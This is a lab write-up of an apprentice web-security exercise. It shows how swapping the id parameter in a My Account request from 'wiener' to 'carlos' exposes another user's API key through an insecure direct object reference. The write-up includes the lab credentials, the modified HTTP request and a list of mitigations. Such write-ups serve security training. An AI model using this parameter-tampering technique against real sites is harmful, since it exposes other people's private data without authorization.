## 🛡️ Lab: User ID controlled by request parameter  
**Level**: Apprentice  
**Date**: August 20, 2025  
**Goal**: Exploit horizontal privilege escalation by manipulating the `id` parameter to access another user’s data.  

---

### 🧰 Tools  
- Burp Suite  
- Repeater  
- Browser  

---

### 🧭 Steps  

1. Logged in with the supplied credentials:  
   ```
   wiener:peter
   ```  

2. Navigated to **My Account** page.  
   - Observed the request:  
     ```
     GET /my-account?id=wiener
     ```

3. Sent this request to **Burp Repeater**.  

4. Modified the `id` parameter:  
   ```
   GET /my-account?id=carlos
   ```

5. The response contained **Carlos's API key**.  

6. Submitted the key to solve the lab.  

✅ **Lab Solved!**  

---

### 🧪 Payload Summary  

**Modified Request**:  
```
GET /my-account?id=carlos HTTP/1.1  
Host: YOUR-LAB-ID.web-security-academy.net  
Cookie: session=your-valid-session  
```  

---

### 🧠 What I Learned  

- This is a classic case of **Insecure Direct Object References (IDOR)**.  
- Simply relying on user-controlled parameters (`id`) for access control is **unsafe**.  
- Horizontal privilege escalation allows attackers to access **other users’ data** without needing admin access.  

---

### 🔐 Mitigation & Prevention  

- Enforce **server-side access control checks** for every request.  
- Never trust user-supplied parameters (`id`, `username`, etc.) to decide authorization.  
- Implement **session-based object ownership validation**.  
- Use **UUIDs** or unpredictable identifiers instead of sequential usernames/IDs.  
- Log and monitor for abnormal parameter tampering.  

---
